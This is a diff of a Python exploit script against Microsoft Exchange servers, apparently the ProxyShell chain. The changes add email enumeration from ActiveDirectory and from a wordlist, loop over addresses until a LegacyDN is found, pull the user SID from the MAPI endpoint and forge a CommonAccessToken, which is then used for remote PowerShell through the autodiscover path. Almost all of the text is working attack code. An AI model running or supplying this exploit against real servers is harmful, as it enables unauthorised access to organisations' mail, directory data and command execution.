@@ -16,8 +16,46 @@ req = requests.session()
 
 proxies = {
     "http": "http://127.0.0.1:8080",
-    "https": "https://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080",
 }
+
+user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
+
+def getMail(target):
+    eb_headers = {
+        "User-Agent": user_agent,
+        "Cookie": "email=autodiscover/autodiscover.json/@gmail.com",
+        "Content-Type": "text/xml",
+    }
+    ews_data = """<?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope
+            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+            xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
+            xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
+            xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+        >
+            <soap:Body>
+                <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
+                    <m:UnresolvedEntry>smtp</m:UnresolvedEntry>
+                </m:ResolveNames>
+            </soap:Body>
+        </soap:Envelope>
+    """
+    resb = req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/ews/exchange.asmx", headers=eb_headers, data=ews_data, verify=False)
+    email_list = findall("(?:<t:EmailAddress>)(.+?)(?:</t:EmailAddress>)", resb.text)
+
+    with open("users.txt") as filei:
+        users_list = filei.read().splitlines()
+    try:
+        domain = resb.headers["X-CalculatedBETarget"].split('.',1)[1]
+        print(f"[+] Domain: {domain}")
+
+        for user in users_list:
+            email_list.append(f"{user}@{domain}")
+    except KeyError:
+        print("[-] No X-CalculatedBETarget")
+
+    return email_list
 
 def getToken(uname, sid):
     version = 0
@@ -35,7 +73,7 @@ def getToken(uname, sid):
     login_data = b'L' + (len(uname)).to_bytes(1, "little") + uname.encode()
     user_data = b'U' + (len(sid)).to_bytes(1, "little") + sid.encode()
     group_data = b'G' + pack("<II", 1, 7) + (len(gsid)).to_bytes(1, "little") + gsid.encode()
-    ext_data = b'E' + pack(">I", 0) 
+    ext_data = b'E' + pack(">I", 0)
 
     raw_token += version_data
     raw_token += type_data
@@ -46,40 +84,14 @@ def getToken(uname, sid):
     raw_token += group_data
     raw_token += ext_data
 
-    data = b64encode(raw_token).decode()
-
-    return data
-
-def getMail(target):
-    eb_headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
-        "Cookie": "email=autodiscover/autodiscover.json/v1.0/@gmail.com",
-        "Content-Type": "text/xml",
-    }
-    ews_data = """<?xml version="1.0" encoding="utf-8"?>
-        <soap:Envelope
-            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-            xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
-            xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
-            xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
-        >
-            <soap:Body>
-                <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
-                    <m:UnresolvedEntry>smtp</m:UnresolvedEntry> 
-                </m:ResolveNames>
-            </soap:Body>
-        </soap:Envelope>
-    """
-    resb = req.post(url=f"{target}/autodiscover/autodiscover.json/v1.0/@gmail.com/ews/exchange.asmx", headers=eb_headers, data=ews_data, verify=False)
-    email_list = findall("(?:<t:EmailAddress>)(.+?)(?:</t:EmailAddress>)", resb.text)
-    return email_list
+    return b64encode(raw_token).decode()
 
 def exploit(target):
     try:
         print(f"[*] Target: {target}")
 
         ua_headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
+            "User-Agent": user_agent,
         }
         resa = req.get(url=f"{target}/owa/any", headers=ua_headers, verify=False, allow_redirects=False)
         try:
@@ -96,31 +108,36 @@ def exploit(target):
         else:
             print("[-] No User")
             exit(0)
-        usera = email_list[0]
 
-        legacydn = ""
-        autodiscover_data = f"""<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
-            <Request>
-                <EMailAddress>{usera}</EMailAddress>
-                <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
-            </Request>
-        </Autodiscover>"""
-        ec_headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
-            "Cookie": "email=autodiscover.json/v1.0/@gmail.com",
-            "Content-Type": "text/xml",
-        }
-        resc = req.post(url=f"{target}/autodiscover/autodiscover.json/v1.0/@gmail.com/autodiscover.xml", headers=ec_headers, data=autodiscover_data, verify=False)
-        if f"DisplayName" in resc.text:
-            legacydn = findall("(?:<LegacyDN>)(.+?)(?:</LegacyDN>)", resc.text)
-            print(f"[+] LegacyDN: {legacydn}")
-        else:
-            print("[-] No LegacyDN")
-            exit(0)
+        email_list_num = len(email_list)
+        for i in range(email_list_num+1):
+            try:
+                usera = email_list[i]
+            except IndexError:
+                print("[-] No LegacyDN")
+                exit(0)
+
+            legacydn = ""
+            autodiscover_data = f"""<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
+                <Request>
+                    <EMailAddress>{usera}</EMailAddress>
+                    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
+                </Request>
+            </Autodiscover>"""
+            ec_headers = {
+                "User-Agent": user_agent,
+                "Cookie": "email=autodiscover.json/@gmail.com",
+                "Content-Type": "text/xml",
+            }
+            resc = req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/autodiscover.xml", headers=ec_headers, data=autodiscover_data, verify=False)
+            if "DisplayName" in resc.text:
+                legacydn = findall("(?:<LegacyDN>)(.+?)(?:</LegacyDN>)", resc.text)
+                print(f"[+] LegacyDN: {legacydn[0]}")
+                break
 
         ed_headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
-            "Cookie": "email=autodiscover/autodiscover.json/v1.0/@gmail.com",
+            "User-Agent": user_agent,
+            "Cookie": "email=autodiscover/autodiscover.json/@gmail.com",
             "X-Requesttype": "Connect",
             "X-Requestid": "{E2EA6C1C-E61B-49E9-9CFB-38184F907552}:123456",
             "X-Clientinfo": "{2EF33C39-49C8-421C-B876-CDF7F2AC3AA0}:123",
@@ -128,7 +145,7 @@ def exploit(target):
             "Content-Type": "application/mapi-http",
         }
         mapi_data = f"{legacydn[0]}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
-        resd = req.post(url=f"{target}/autodiscover/autodiscover.json/v1.0/@gmail.com/mapi/emsmdb?MailboxId=gmail.com", headers=ed_headers, data=mapi_data, verify=False)
+        resd = req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/mapi/emsmdb?MailboxId=gmail.com", headers=ed_headers, data=mapi_data, verify=False)
         try:
             sid = resd.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
             print(f"[+] Origin SID: {sid}")
@@ -143,16 +160,16 @@ def exploit(target):
 
         token = getToken(usera, sid)
         print(f"[+] CommonAccessToken: {token}")
-        return usera, sid, token
-
     except requests.exceptions.RequestException as e:
         print(f"[ReqError]: {e}\n=>{target}")
         exit(0)
 
+    return usera, sid, token
+
 def execmdlet(server, token, **kwargs):
     wsman = WSMan(
         server=server, port=443, cert_validation=False,
-        path=f"/autodiscover/autodiscover.json/v1.0/@gmail.com/powershell?email=autodiscover/autodiscover.json/v1.0/@gmail.com&X-Rps-CAT={token}"
+        path=f"/autodiscover/autodiscover.json/@gmail.com/powershell?email=autodiscover/autodiscover.json/@gmail.com&X-Rps-CAT={token}"
     )
     with wsman, RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
         ps = PowerShell(pool)
